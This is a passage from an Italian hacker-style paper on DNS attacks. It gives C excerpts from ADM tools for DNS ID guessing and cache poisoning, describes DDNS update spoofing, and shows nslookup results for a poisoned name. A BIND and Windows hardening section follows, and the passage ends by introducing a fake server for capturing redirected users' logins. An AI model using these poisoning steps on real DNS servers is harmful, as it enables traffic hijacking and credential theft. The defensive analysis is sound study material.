|  stesso shok un "DNS ID brutal predictor" che lo descrive pienamente.    |
|                                                                          |
|  Esempio di ritorno di query:                                            |
|                                                                          |
|  ns.vittima.edu.1538 > hacker.31337.edu.53: 693+ A? host.medium.org.(33) | 
|                                                                          |
|  In questo caso l'attacker usera' un ID, ad esempio, di 710 con valore   |
|  decrementale in modo da tentare il completamento dell'accoppiata        |
|  ID query/response. Tutto cio' tramite questo semplice loop:             |
|                                                                          |
|  <--from--ADMnOg00d.c-->                                                 |
|                                                                          |
|  for(;loop >= ID-10 ;loop--){                                            |
|        dns->id      = htons(loop);                                       |
|        dns->qr      = 1;                                                 |
|        dns->rd      = 1;                                                 |
|        dns->aa      = 1;                                                 |
|        dns->que_num = htons(1);                                          |
|        dns->rep_num = htons(1);                                          |
|                                                                          |
|        i=makepaketAW(data,fakename,SPOOFIP,TYPE_A);                      |
|        udp_send(sraw,trust,d_ip2,53,53,buffer2,DNSHDRSIZE+i);            |
|     }                                                                    |
|                                                                          |
|  <--EoF-->                                                               |
|                                                                          |
|  dove loop equivale al campo [ID] da noi inserito e corrispondente       |
|  ad argv[9]. Se non fosse immesso il tool partira' da 65535 (assai       |
|  menu funzionale ed assai brutale.. ).                                   |
|                                                                          |
|  Ora che ho analizzato anche l'ID guessing, si puo' passare con balzo    |
|  deciso ai prossimi paragrafi che analizzano in dettaglio DNS spoofing   |
|  e DNS caching/poisoning.                                                |
|                                                                          |
|  -sub_E() DNS Spoofing: {                                                |
|                                                                          |
|  Il DNS spoofing e' l'aperitivo di un DNS caching/poisoning/hijacking    |
|  in quanto permette ad un host di figurare come un altro che potrebbe    |
|  avere relazioni di fiducia (trusted-hosts) con il server attaccato.     |
|  Nel testo non analizzero' lo spoofing in generale in quanto dovrebbe    |
|  essere una prerogativa di chi legge questo paper; si sappia solo che    |
|  la tipologia di spoofing che viene attuata con i DNS e' di tipo         |
|  blind-spoofing, ovvero spoofing cieco.                                  |
|  Poniamo di avere una shell # su di un server DNS autoritativo per un    |
|  dominio. Ponendo in essere l'attacco esposto nel paragrafo precedente   |
|  notiamo che la shell ci serve per trovare a che punto e' l'ID del       |
|  server sotto attacco per poi inviargli una response con lo stesso ID al | 
|  fine di renderla valida.                                                |
|  Spoofing sinteticamente significa appunto l'impersonificazione di un    |
|  host in un altro per vari fini.                                         |
|  Il DNS spoofing puo' essere attuato per diversi modi, ad esempio tra    |
|  i piu' utilizzati:                                                      |
|  - zone transfer: supponendo di avere configurato un server DNS con ACL  |
|    di tipo allow-transfer tipo:                                          |
|                                                                          |
|    zone "pippo.com" {                                                    |
|              type master;                                                |
|              file "master_pippo.com";                                    |
|              allow-transfer { 192.168.0.2;};                             |
|                    };                                                    |
|                                                                          |
|    tramite spoofing l'attacker con IP 31.3.3.7 in ascolto sullo stesso   |
|    segmento di rete puo' tranquillamente forzare una zone transfer e     |
|    intercettare la tabella delle zone della rete interna. Non e' molto   |
|    carino permettere ad un attacker di sapere la topologia interna degli | 
|    host e i loro nomi, anche perche' in molti casi il corrispettivo      |
|    logico dell'IP e' un nome mnemonico che descrive anche l'host e la    |
|    sua funzione all'interno della rete. Capiamo bene che se l'attacker   |
|    dovesse entrare in possesso ad esempio di queste informazioni:        |
|                                                                          |
|    192.168.0.25   IN  PTR   database.pippo.com.                          |
|    fw.pippo.com.  IN  A     192.168.0.254                                |
|    192.168.0.22   IN  PTR   ssh.pippo.com.                               |
|                                                                          |
|    saprebbe subito gli host da colpire e la loro posizione al'interno    |
|    della rete..                                                          |
|                                                                          |
|  - caching/poisoning/updating: per il caching e il poisoning e' facile   |
|    intuire che se l'attacker riesce a venire a conoscenza del corretto   |
|    ID della query in uscita dal server che effettuera' la recursive      |
|    resolution, non ci vuole poi molto ad inviare una response con IP     |
|    sorgente identico a quello del server autoritativo per quel SLD       |
|    e cambiare informazioni o magari aggiungerne in modo da essere        |
|    ritenute valide dal server attaccato (sempre se i pacchetti arrivano  |
|    prima del server reale..).                                            |
|    Per l'updating, se ad esempio abbiamo configurato un DNS nel seguente | 
|    modo:                                                                 |
|                                                                          |
|    zone "pippo.com" {                                                    |
|              type master;                                                |
|              file "master_pippo.com";                                    |
|              allow-update { 192.168.0.2;};                               |
|                    };                                                    |
|                                                                          |
|  e' semplice intuire a cosa possa servire in questo caso DNS spoofing.   |
|                                                                          |
|  Nei prossimi due paragrafi andro' ad illustrare ed analizzare,in teoria | 
|  ed in pratica, come vengono effettuati i "sempreverdi" attacchi di      |
|  DNS caching/poisoning e di DDNS update spoofing, che sono il fulcro     |
|  ed il culmine del presente testo nonche' il core del progetto AmPaRo.   |
|                                                                          |
|  };                                                                      |
|                                                                          |
|  -sub_F() DNS poisoning/caching: {                                       |
|                                                                          |
|  Eccoci arrivati alla parte forse piu' interessante del presente testo,  |
|  assieme al prossimo ed ultimo paragrafo conclusivo del capitolo         |
|  riguardante l'analisi tipologica dei diversi tipi di attacchi ai server | 
|  DNS. I punti precedenti sono in definitiva i passi da eseguire ( ad     |
|  eccezione dell'attacco DoS) per raggiungere un obiettivo preciso,ovvero | 
|  per l'attuazione dell'attacco esposto nel presente paragrafo e nel      |
|  seguente.                                                               |
|                                                                          |
|  Per DNS poisoning/caching si intende l'inserimento/sostituzione di dati | 
|  falsi in un database/cache al fine di modificare la risoluzione di un   |
|  nome logico o di un IP address per diversi scopi (DoS, redirection..).  |
|                                                                          |
|  Nei paragrafi precedenti ho analizzato i passi intermedi che vengono    |
|  compiuti da un attacker per finalizzare l'attacco;per ricordarlo questi | 
|  sono:                                                                   |
|                                                                          |
|  - DNS footprinting                                                      |
|  - DNS ID guessing                                                       |
|  - DNS spoofing                                                          |
|                                                                          |
|  gli ultimi 2 passi, data la loro imminente sequenzialita', solitamente  |
|  sono raggruppati in un unico "big-step" e inseriti assieme in un unico  |
|  tool.                                                                   |
|  Sono usati diversi modi per effettuare questo attacco; io analizzero'   |
|  i 2 che ritengo migliori in quanto ad algoritmo ed efficienza in ordine | 
|  dal minore al migliore.                                                 |
|                                                                          |
|  Per spiegare il funzionamento dell'attacco in modo semplice e chiaro    |
|  (lo spero.. :P) mi avvarro' di "macro" sostitutive di hostname e ip.    |
|                                                                          |
|  Topologia reti e macro preventive:                                      |
|                                                                          |
|  DNS_VITTIMA=> x.x.x.1  -> ns.vittima.edu   -> dns vittima               |
|  SER_VITTIMA=> x.x.x.x  -> serv.vittima.edu -> servizio su vittima.edu   |
|  DOM_TRUST  => x.x.x.2  -> trust.edu        -> dominio di trust          |
|  DNS_TRUST  => x.x.x.3  -> ns.trust.edu     -> dns dominio di trust      |
|  SPOOF_TRUST=> x.x.x.4  -> ns.firm.com      -> dns di trust per spoof    |
|  ATTACKER   => x.x.x.5  -> ppp-110.libero.it-> attacker                  |
|  SPOOFNAME  =>             h4x0r.evil.com   -> da inserire in cache      |
|  SPOOFIP    => 31.3.3.7                     -> da inserire in cache      |
|  FAKE_IP1   => 1.1.1.1                      -> ip fake per richieste     |
|  FAKE_IP2   => 2.2.2.2                      -> ip fake per richieste     |
|  FAKE_IP3   => 3.3.3.3                      -> ip fake per richieste     |
|  RAND_TRUST => x.x.x.6  -> rand.trust.edu   -> fakename random           |
|                                                                          |
|  ### PRIMO METODO ###                                                    |
|                                                                          |
|  Un metodo di media validita' e' quello che puo' essere chiamato "DNS ID | 
|  brutal predictor" per la modalita' di inizio.                           |
|  Questo metodo richiede solamente un sh# su di un host senza necessitare | 
|  di una sh # su un DNS autoritativo per un SLD.                          |
|  Questo lo rende di gran lunga uno dei piu' utilizzati, soprattutto da   |
|  script-kiddye e vari, per compiere attacchi di DNS poisoning/caching.   |
|  Un tool che fa questo sporco lavoro e', ad esempio, ADMnOg00d di shok   |
|  degli ADM, che prenderemo come esempio per l'analisi dell'attacco.      |
|                                                                          |
|  Nelle parti del sorgente originale,le variabili saranno sostituite da   |
|  macro predefinite precedentemente.                                      |
|                                                                          |
|  L'attuazione di questo metodo poco ortodosso puo' essere riassunto      |
|  in 4 semplici passi principali:                                         |
|                                                                          |
|  1) Viene inviata una richiesta di risoluzione dell'hostname RAND_TRUST  |
|     al dns server vittima DNS_VITTIMA usando come indirizzo sorgente     |
|     FAKE_IP1.In questo modo DNS_VITTIMA iniziera' in modalita' ricorsiva | 
|     a cercare di risolvere il nome logico, arrivando a richiederlo a     |
|     DNS_TRUST. Ma se un fake DNS_TRUST inviasse risposte prima di quello | 
|     reale e riuscisse ad azzeccare il range dell'ID....                  |
|                                                                          |
|     /* start source example */                                           |
|                                                                          |
|     sprintf(RAND_TRUST,"%i%i%i%i%i%i.%s",                                |
|                myrand(),                                                 |
|                myrand(),                                                 |
|                myrand(),                                                 |
|                myrand(),                                                 |
|                myrand(),                                                 |
|                myrand(),                                                 |
|                DOM_TRUST);                                               |
|                                                                          |
|     sendquestion(FAKE_IP1,DNS_VITTIMA,RAND_TRUST,TYPE_A);                |
|                                                                          |
|     /* end source example */                                             |
|                                                                          |
|  2) Per 10 volte da ID a diminuire vengono inviati pacchetti di response | 
|     a DNS_VITTIMA usando come indirizzo sorgente DNS_TRUST, e contenente | 
|     ad esempio:   RAND_TRUST.   IN   A   FAKE_IP2                        |
|     In questo modo si cerca di inserir nella cache del DNS_VITTIMA il RR | 
|     sopra esposto (se l'ID e' compreso nel range ID -> ID-10 ).          |
|                                                                          |
|     /* start source example */                                           |
|                                                                          |
|     ID=loop;                                                             |
|     for(;loop >= ID-10 ;loop--){                                         |
|        dns->id      = htons(loop);                                       |
|        dns->qr      = 1;                                                 |
|        dns->rd      = 1;                                                 |
|        dns->aa      = 1;                                                 |
|        dns->que_num = htons(1);                                          |
|        dns->rep_num = htons(1);                                          |
|                                                                          |
|        i=makepaketAW(data,RAND_TRUST,FAKE_IP2,TYPE_A);                   |
|        udp_send(sraw,DNS_TRUST,DNS_VITTIMA,53,53,buffer2,DNSHDRSIZE+i);  |
|     }                                                                    |
|                                                                          |
|     /* end source example */                                             |
|                                                                          |
|     L'ID in questo tool e' rappresentato da argv[9] e puo' essere        |
|     omesso.Nel caso in cui fosse omesso partira' dal massimo valore che, | 
|     dato che il campo e' di 2byte->16bit->2^16, ammontera' a 65536.      |
|     Converrebbe sapere all'incirca intorno a che cifra ammonta..per      |
|     sveltezza, comodita' e...delicatezza                                 |
|                                                                          |
|  3) Viene quindi inviata una richiesta di risoluzione dell'hostname      |
|     RAND_TRUST al server vittima DNS_VITTIMA, utilizzando come indirizzo | 
|     sorgente l'ip dell'host dell'attacker ATTACKER (chiaro visto che la  |
|     richiesta viene inviata via SOCK_DGRAM e non tramite SOCK_RAW..).    |
|     In questo modo chiediamo a DNS_VITTIMA se RAND_TRUST ha un indirizzo | 
|     IP (quindi se il caching/poisoning e' stato effettuato).             |
|                                                                          |
|     /* start source example */                                           |
|                                                                          |
|     dns_qs_no_rd(s_r,d_ip2,fakename,myrand());                           |
|     void dns_qs_no_rd(int s,u_long d_ip,char *wwwname,int ID)            |
|     {                                                                    |
|       struct dnshdr *dns;                                                |
|       char   *data;                                                      |
|       char   buffer[1024];                                               |
|       int i;                                                             |
|                                                                          |
|       dns  = (struct dnshdr *)buffer;                                    |
|       data = (char *)(buffer+DNSHDRSIZE);                                |
|       bzero(buffer,sizeof(buffer));                                      |
|                                                                          |
|       dns->id      = htons(ID);                                          |
|       dns->qr      = 0;                                                  |
|       dns->rd      = 0; /* dont want the recusion !! */                  |
|       dns->aa      = 0;                                                  |
|       dns->que_num = htons(1);                                           |
|       dns->rep_num = htons(0);                                           |
|       i=makepaketQS(data,wwwname,TYPE_A);                                |
|       senddnspkt(s,d_ip,wwwname,NULL,dns);                               |
|     }                                                                    |
|                                                                          |
|     /* end source example */                                             |
|                                                                          |
|     Per questa richiesta non viene utilizzata la modalita' ricorsiva     |
|     (come precisamente indicato) bensi' la modalita' iterativa. Questo   |
|     in quanto se la cache di DNS_VITTIMA non dovesse contenere niente    |
|     a riguardo di RAND_TRUST non si vuole che il server vittima proceda  |
|     a chiedere da lui ancora la risoluzione a DNS_TRUST trovando         |
|     l'attacker impreparato a fornire risposte falsate/corrette.          |
|                                                                          |
|  4) A questo punto si attende una risposta da parte di DNS_VITTIMA.      |
|     Questa potra' avere 3 differenti caratteristiche, con 3 differenti   |
|     strade da intraprendere:                                             |
|     - nessuna risposta                                                   |
|     - risposta arrivata ma campo data/answers vuoto                      |
|     - risposta arrivata e campo data/answers contenente dati             |
|                                                                          |
|     Nel caso in cui non si riceva nessuna risposta entro 3 secondi viene | 
|     reinviata la richiesta di risoluzione vista nel punto precedente.    |
|                                                                          |
|     /* start source example */                                           |
|                                                                          |
|     for(timez=0;timez < TIMEOUT; timez++){                               |
|      if( recvfrom(s_r,buffer,sizeof(buffer),0,(struct sockaddr *) \      |
|                                              ,) != -1 )                  |
|        {                                                                 |
|         printf("ok whe have the reponse ;)\n");                          |
|         timez = 0;                                                       |
|         break;                                                           |
|        }                                                                 |
|      usleep(10);                                                         |
|      timez++;                                                            |
|     }                                                                    |
|    if(timez != 0){                                                       |
|      printf("hum no reponse from the NS ressend question..\n");          |
|      dns_qs_no_rd(s_r,DNS_VITTIMA,RAND_TRUST,myrand());                  |
|      }                                                                   |
|                                                                          |
|     /* end source example */                                             |
|                                                                          |
|     Nel caso invece che arrivi una risposta ma con campo data/answers    |
|     vuoto ricominciera' il ciclo intero modificando il range di ID.      |
|                                                                          |
|     if(sin_rcp.sin_addr.s_addr ==  DNS_VITTIMA )                         |
|       if(sin_rcp.sin_port == htons(53) )                                 |
|         {                                                                |
|          if( dns_recv->qr == 1 )                                         |
|            if( dns_recv->rep_num == 0 )                                  |
|            /* hum we dont have found the right ID */                     |
|              printf("try %i < ID < %i \n",ID-10,ID);                     |
|                                                                          |
|     Nel caso in cui invece l'attacker fosse stato fortunato, vedra'      |
|     comparire a video la stringa:                                        |
|                                                                          |
|     "the DNS ID of DNS_VITTIMA iz ID-20 < ID < ID-10 !!                  |
|      let's send the spoof..."                                            |
|                                                                          |
|     A questo punto vien ad apparire la funzione cool di questo capitolo: | 
|                                                                          |
|     dnsspoof(SPOOF_TRUST,DNS_VITTIMA,SPOOFNAME,SPOOFIP,loop,TYPE);       |
|                                                                          |
|     ovvero la funzione che completera' l'attacco di caching/poisoning.   |
|     La funzione provvedera' ad inviare 4 volte una richiesta di          |
|     risoluzione da FAKE_IP3 a DNS_VITTIMA per SPOOFNAME.                 |
|     Quindi provvedera' per 2 volte ad inviare 80 response da SPOOF_TRUST | 
|     a DNS_VITTIMA con la stringa "SPOOFNAME.  IN  A  SPOOFIP", con ID    |
|     incrementale a partire da ID-20. SPOOF_TRUST e' il DNS server che ha | 
|     autorita' sul dominio di spoofname.                                  |
|                                                                          |
|     /* start source example */                                           |
|                                                                          |
|     void dnsspoof(char *dnstrust,char *victim,char *spoofname, \         |
|                                  char *spoofip,int ID,int type)          |
|      {                                                                   |
|     [snip]                                                               |
|     /* send question ... */                                              |
|    if( type ==  TYPE_PTR)                                                |
|      for(loop=0;loop<4;loop++)                                           |
|          sendquestion(FAKE_IP3,DNS_VITTIMA,SPOOFIP,type);                |
|                                                                          |
|    if( type == TYPE_A)                                                   |
|      for(loop=0;loop<4;loop++)                                           |
|           sendquestion(FAKE_IP3,DNS_VITTIMA,SPOOFNAME,type);             |
|                                                                          |
|            /* now its time to awnser Quickly !!! */                      |
|    for(rere = 0; rere < 2;rere++){                                       |
|     for(loop=0;loop < 80;loop++){                                        |
|      printf("trustip %s,vitcimip %s,spoofna %s,spoofip %s,ID %i,type \   |
|            %i\n",DNS_TRUST,DNS_VITTIMA,SPOOFNAME,SPOOFIP,ID+loop,type);  |
|        sendawnser(DNS_TRUST,DNS_VITTIMA,SPOOFNAME,SPOOFIP,ID+loop,type); | 
|          }                                                               |
|       }                                                                  |
|     }                                                                    |
|                                                                          |
|     /* end source example */                                             |
|                                                                          |
|     A questo punto l'attacker si potra' ritenere fortunato.. e ad una    |
|     richiesta in user-space con ll fido nslookup si avra':               |
|                                                                          |
|     [snhyper@Charlotte1:~] nslookup 31.3.3.7 ns.vittima.edu              |
|     Server:  ns.vittima.edu                                              |
|     Address: x.x.x.1                                                     |
|                                                                          |
|     Name:    h4x0r.evil.com                                              |
|     Address: 31.3.3.7                                                    |
|                                                                          |
|     oppure                                                               |
|                                                                          |
|     [snhyper@Charlotte1:~] nslookup h4x0r.evil.com ns.vittima.edu        |
|     Server:  ns.vittima.edu                                              |
|     Address: x.x.x.1                                                     |
|                                                                          |
|     Name:    h4x0r.evil.com                                              |
|     Address: 31.3.3.7                                                    |
|                                                                          |
|  ### SECONDO METODO ###                                                  |
|                                                                          |
|  Il secondo ed ultimo metodo in analisi e', come gia detto, il migliore; | 
|  puo' essere definito in questo modo perche' incorpora in un unico tool  |
|  un "DNS ID predictor" preciso ed un "DNS poisoner"..letale.. :P         |
|  Il requisito che pero' lo rende usato per lo piu' dagli attacker di un  |
|  certo livello e' la necessita' di una shell root su di un server DNS    |
|  autoritativo per un dominio, che di solito e' un server compromesso     |
|  a sua volta. La shell root e' necessaria per l'accesso alle raw socket  |
|  e per il binding sulle well-known ports (nel nostro caso la 53udp).     |
|                                                                          |
|  Un tool che permette questo tipo di attacco e', ad esempio, ADMsnOOfID  |
|  sempre di shok degli ADM.                                               |
|  Anche questo tool della ADM crew si serve delle funzioni delle libpcap  |
|  ma in aggiunta permette attacco multi-interfaces dando la possibilita'  |
|  di specificare ppp+ o eth+.                                             |
|                                                                          |
|  Anche in questo caso e' possibile analizzare l'algoritmo di attacco     |
|  schematizzandolo in 2 semplici passi principali:                        |
|                                                                          |
|  1) Viene inviata una richiesta di risoluzione dell'hostname RAND_TRUST  |
|     al dns server vittima DNS_VITTIMA usando come indirizzo sorgente     |
|     FAKE_IP1.In questo modo DNS_VITTIMA iniziera' in modalita' ricorsiva | 
|     a cercare di risolvere il nome logico, arrivando a richiederlo a     |
|     DNS_TRUST. In questo caso pero' DNS_TRUST sara' l'host compromesso   |
|     sul quale l'attacker sfrutta una sh #.                               |
|                                                                          |
|     /* start source example */                                           |
|                                                                          |
|     sprintf(RAND_TRUST,"%d%d%d.%s",myrand(),myrand(),myrand(),DOM_TRUST) | 
|     dnssend->id      = 2600; /* id fittizio */                           |
|     dnssend->qr      = 0;                                                |
|     dnssend->rd      = 1;                                                |
|     dnssend->aa      = 0;                                                |
|     dnssend->que_num = htons(1);                                         |
|     dnssend->rep_num = htons(0);                                         |
|     i = makepaketQS(data2,RAND_TRUST,TYPE_A);                            |
|     udp_send(sraw,FAKE_IP1,DNS_VITTIMA,2600+con,53,buffer2,DNSHDSIZE+i); | 
|                                                                          |
|     /* end source example */                                             |
|                                                                          |
|  2) A questo punto si attende con una pcap_next() in un ciclo di while   |
|     la venuta della fatidica query che dara' in pasto l'ID all'attacker. | 
|     Con qualke construtto di if si vaglia se il pacchetto ha protocollo  |
|     udp,poi se l'IP sorgente e' quello di DNS_VITTIMA e il destinatario  |
|     e' DNS_TRUST, se la porta di destinazione e' la 53 ed infine se il   |
|     campo QR e' settato a 0 (indicando che il DNS packet e' una query).  |
|     Nel caso in cui un ciclo dovesse saltare, si ricomincia da capo da   |
|     questo punto (reinizia il while).                                    |
|     Nel caso invece che il pacchetto rispetti tutte le condizioni, e che | 
|     quindi sia la query attesa, viene subito preso l'ID del pacchetto    |
|     e fatta scattare la gia' vista funzione dnsspoof() che portera' a    |
|     completamento l'attacco di posioning/caching.                        |
|                                                                          |
|     /* start source example */                                           |
|                                                                          |
|     if(ip->protocol == 17 )                                              |
|       if(ip->saddr.s_addr  == DNS_VITTIMA )                              |
|         if(ip->daddr.s_addr == DNS_TRUST )                               |
|           if(udp->dest  == htons(53) )                                   |
|             if(dnsrecv->qr == 0 )  {                                     |
|                                                                          |
|           ID = dnsrecv->id ;    /* preso l'ID  */                        |
|           DA_ID = ntohs(ID);                                             |
|                                                                          |
|           dnsspoof(DNS_TRUST,DNS_VITTIMA,SPOOFNAME,SPOOFIP,DA_ID,type);  |
|                                                                          |
|     /* end source example */                                             |
|                                                                          |
|     A questo punto un semplice test con nslookup verifichera' il         |
|     successo dell'attacco o meno.                                        |
|                                                                          |
|  };                                                                      |
|                                                                          |
|  -sub_G() DDNS update spoofing: {                                        |
|                                                                          |
|  Da non molto tempo ha fatto comparsa il cosiddetto DDNS, ovvero il      |
|  Dynamic DNS, che ha subito allargato la propria zona di influenza       |
|  sul mercato di internet per i suoi vantaggi.                            |
|  Il DDNS permette update di RRs, singoli o in set, dinamicamente con     |
|  un pacchetto di update senza mettere mano ai file di configurazione.    |
|  Chiaramente i portali che offrono servizi di url-redirection,           |
|  "third-level domain" etc.. ne hanno subito fatto uso permettendo ai     |
|  propri utenti registrati di fare update dinamici di propri sottodomini  |
|  e di mapparli sul proprio IP, che non deve necessariamente essere       |
|  statico. Da quando questo servizio ha preso piede si vedono infatti     |
|  molti personaggi che "circolano" soprattutto su irc con host del tipo:  |
|  31337.h4x0r.d00d.homelinux.org e vari..,talvolta spacciando un semplice | 
|  update di RR in un vhost hackato..                                      |
|                                                                          |
|  In ogni caso anche il protocollo DDNS presenta dei bachi che permettono | 
|  un update incontrollato di RRs e RRset,minacciando ancora una volta la  |
|  sicurezza di quelle aziende che se ne servono per lavoro.               |
|                                                                          |
|  Un tool che dimostra questo attacco e', ad esempio, ddns_spoofer di     |
|  awacs dei 3xT. Requisito per il completamento di questo tipo di attacco | 
|  e' la conoscenza dell'owner del RR, senza il quale risulta impossibile  |
|  completare un update.                                                   |
|                                                                          |
|  Le azioni che sono permesse via DDNS sono:                              |
|  - Aggiunta di un RR o piu' ad un RRset                                  |
|  - Eliminazione di un RRset                                              |
|  - Eliminazione di tutti i RRset da un nome                              |
|  - Eliminazione di un RR da un RRset                                     |
|                                                                          |
|  e sono distinte dal contenuto dei campi principali nel seguente modo:   |
|                                                                          |
|    CLASS    TYPE     RDATA    significato                                |
|    ------------------------------------------------------------------    |
|    ANY      ANY      vuoto    Eliminazione di tutti i RRset da un nome   |
|    ANY      rrset    vuoto    Eliminazione di un RRset                   |
|    NONE     rrset    rr       Eliminazione di un RR da un RRset          |
|    zone     rrset    rr       Aggiunta di un RR                          |
|                                                                          |
|                                                                          |
|  Un update message puo' essere schematizzato nel seguente modo:          |
|                                                                          |
|       +---------------------+                                            |
|       |        Header       |                                            |
|       +---------------------+                                            |
|       |         Zone        |                                            |
|       +---------------------+                                            |
|       |     Prerequisite    | RRs or RRsets which must (not) preexist    |
|       +---------------------+                                            |
|       |        Update       | RRs or RRsets to be added or deleted       |
|       +---------------------+                                            |
|       |   Additional Data   | additional data                            |
|       +---------------------+                                            |
|                                                                          |
|  header  -> e' il classico dns header modificato per indicare la         |
|            tipologia di update che si sta compiendo, ed altre flags.     |
|                                                                          |
|  zone    -> specifica la zona nella quale fare l'update                  |
|                                                                          |
|  Prereq. -> RRs o RRsets che devono/non devono esistere                  |
|                                                                          |
|  Update  -> RRs o RRsets da aggiungere o da eliminare                    |
|                                                                          |
|  Add.data-> dati aggiuntivi per completare l'update                      |
|                                                                          |
|  E' facile intuire come, avendo a disposizione il RRset di riferimento   |
|  e l'owner del RRset, non sia complicato costruire un update message     |
|  spoofato in modo da aggiungere o eliminare RR/RRset da un DNS database. | 
|                                                                          |
|  Leggere il sorgente di ddns_spoofer e la rfc2136 permette di farsi una  |
|  idea su come non sia affatto semplice gestire un DDNS server e su come  |
|  sia possibile evadere anche le nuove feature di Bind > 8.x quali le     |
|  ACL allow-update etc..                                                  |
|                                                                          |
|  };                                                                      |
|                                                                          |
|                                                                          |
|  0x07) Protezione server DNS                                             |
|                                                                          |
|  -sub_A() Macchine posix (*nix,*BSD): {                                  |
|                                                                          |
|  Gli attacchi ai server dns hanno preso successo in poco tempo e, dato   |
|  che non e' certo piacevole per un sysadmin vedersi fregato in questo    |
|  modo, vediamo di applicare poche semplici regole che permettono di      |
|  hardenizzare in giusto modo un server DNS, tanto da potersi ritenere    |
|  sicuri in questo campo.                                                 |
|                                                                          |
|  Il primo passo sta nel scegliere la versione da utilizzare.. questo     |
|  e' soggettivo. Io non utilizzerei piu' il ramo 4.x.x in quanto ormai    |
|  obsoleto e poco sicuro anche se ancora molto utilizzato.                |
|  Per chi e' del filone di quelli che pensano che "troppo nuovo == troppo | 
|  pericoloso" stare sull'8.x ...se no buttarsi sulla nuova 9.x che sembra | 
|  molto valida (ad eccezione del bug con DoS patchabilo di cui ho parlato | 
|  prima).                                                                 |
|                                                                          |
|  In seconda, usare un server dedicato e hardenizzato come Internet DNS,  |
|  senza relazioni trusted hosts e senza permettere login di utenti.       |
|  Un numero minimo di users e servizi sul server significa un minor       |
|  utilizzo di software che potrebbe esporre il server ad attacchi.        |
|  Inoltre il fatto di non essere in una rete di trusted hosts e di essere | 
|  in una rete separata (ad esempio in una DMZ) riduce il rischio di       |
|  intrusione dall'interno.                                                |
|                                                                          |
|  Valutare una possibile sistemazione in ridondanza in modo tale che      |
|  se uno dei due server dovesse cadere sotto attacco, la rete rimarrebbe  |
|  comunque su e funzionante. Nel momento in cui si verificasse un crollo  |
|  di uno dei due Bind, una mail all'admin o un sms (piu' tempestivo,      |
|  fattibile con software apposito tipo gnoki) non sarebbe male..e crearsi | 
|  uno script che faccia cio' e' abbastanza semplice.                      |
|                                                                          |
|  Come spiegato alla voce "sub_B()" permettere i trasferimenti di zona    |
|  solamente agli IP autorizzati.                                          |
|  Inoltre usare le nuove feature di Bind quali TSIG, per avere una        |
|  Transaction SIGnature di autenticazione zone transfer.                  |
|                                                                          |
|  Avere un sistema di DNS basato su ACL. La possibilita' di settare       |
|  delle ACL quali allow-query, allow-transfer, allow-update viene         |
|  solo da Bind 8.x.                                                       |
|                                                                          |
|  Cercare di eliminare gli attacchi di IP spoofing settando le apposite   |
|  feature quali xfernets, ACL in modo intelligente.                       |
|  Oltre a cio' e' necessario stabilire regole precise sui vari firewalls, | 
|  gateway,IDS,routers..etc..                                              |
|                                                                          |
|  Usare il sistema di split-brain servers. Il sistema consiste in due     |
|  dns server separati e tipicamente:                                      |
|  un dns al di fuori della rete e del firewall che fornira' servizio e    |
|  record MX al web server, dialoghera' con gli altri name server e con    |
|  gli altri servizi offerti dalla rete.                                   |
|  L'altro dns all'interno della rete e del firewall  fornira' servizio    |
|  per la rete interna.                                                    |
|                                                                          |
|  Utilizzare DNSSec per avere complicare notevolmente qualsiasi           |
|  tentativo di attacco.                                                   |
|                                                                          |
|  Vietare, o permettere solo previo accertamento con ACL, le richieste    |
|  ricorsive. Per fare cio' basta inserire in named.conf la stringa:       |
|  recursion no;                                                           |
|                                                                          |
|  Far girare Bind con il minimo dei privilegi ( di solito named ) e con   |
|  una corretta umask.                                                     |
|                                                                          |
|  Far girare Bind chrootato. In questo modo diventa difficile in caso di  |
|  compromissione danneggiare il sistema operativo o invadere altri hosts. | 
|                                                                          |
|  Non accettare nessuna informazione per la quale il server querato e'    |
|  autoritativo.                                                           |
|                                                                          |
|  Accettare solo la prima risposta RR di un pacchetto per fare in modo    |
|  di non accettare involontariamente informazioni aggiuntive falsate.     |
|                                                                          |
|  Non mostare la versione di Bind utilizzata (BIND.VERSION in chaos).     |
|  Per nascondere la versione basta inserire nel file di configurazione    |
|  named.conf la stringa:                                                  |
|                         version "DNS server";                            |
|                                                                          |
|  Monitorare i log per cercare attivita' sospette.                        |
|                                                                          |
|  Infine, importantissimo passo e spesso causa di intrusioni, stare       |
|  sempre aggiornati riguardo nuovi bugs e patchare sempre.                |
|                                                                          |
|  Altre informazioni su come hardenizzare un dns server le trovate in     |
|  rete o nel valido paper in slide di Cricket Liu di VerySign             |
|  "securing_an_internet_name_server.pdf".                                 |
|                                                                          |
|  };                                                                      |
|                                                                          |
|  -sub_B() Macchine win: {                                                |
|                                                                          |
|  Per Windoze valgono anche molte delle info precedentemente esposte per  |
|  i sistemi posix.                                                        |
|  In aggiunta:                                                            |
|                                                                          |
|  per WindozeNT 4.0 da SP4, un server DNS NT based puo' filtrare le       |
|  response non sicure. Per abilitare questa feature:                      |
|  -avviare il Registry Editor (regedt32.exe);                             |
|  -cercare la seguente chiave:                                            |
|   HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\DNS\Parameters    |
|  -Dal menu Edit, selezionare Add Value e immettere i seguenti dati:      |
|   Value Name : SecureResponses                                           |
|   Data Type : REG_DWORD                                                  |
|   Value : 1 (Per eliminare i dati non sicuri)                            |
|  -chiudere il Registry Editor.                                           |
|                                                                          |
|  Di default questa chiave non esiste e quindi i dati insicuri non        |
|  sono eliminati dalle response.                                          |
|  Per info su questa feature guardare nel Microsoft Knowledge Base:       |
|  http://support.microsoft.com/default.aspx?scid=kb;en-us;Q198409         |
|                                                                          |
|  Su Windoze2000 invece e' possibile fare la stessa cosa anche via GUI:   |
|  -aprire il DNS Management Console cliccando su start->programs->        |
|   administrative tools->DNS                                              |
|  -cliccare col destro sul nome del server nella finestra a sinistra      |
|  -selezionare properties                                                 |
|  -scegliere la linguetta advanced                                        |
|  -chekkare la casella "Secure cache against pollution".                  |
|                                                                          |
|  };                                                                      |
|                                                                          |
|                                                                          |
|  0x08) Progetto AmPaRo                                                   |
|                                                                          |
|  Il progetto AmPaRo e' un "plug-in" di un attacco di DNS poisoning       |
|  caching o di DDNS update spoofing.                                      |
|  E' l'incarnazione di un fake server dinamico che permette di prendere   |
|  i login(user,passwd) di utenti dopo una redirezione. Vediamo come       |
|  puo' essere schematizzato l'intero processo:                            |
|                                                                          |
|  Processo normale:                                                       |
|                                                                          |
|  1) vittima$ telnet serv.vittima.edu                                     |
|     /* Vittima richiede connessione telnet all'indirizzo SER_VITTIMA */  |
|                                                                          |
|  2) Avendo usato per la connessione telnet un hostname FDQN al posto di  |
|     un IP address,il sistema si preoccupera' di cercar il corrispondente | 
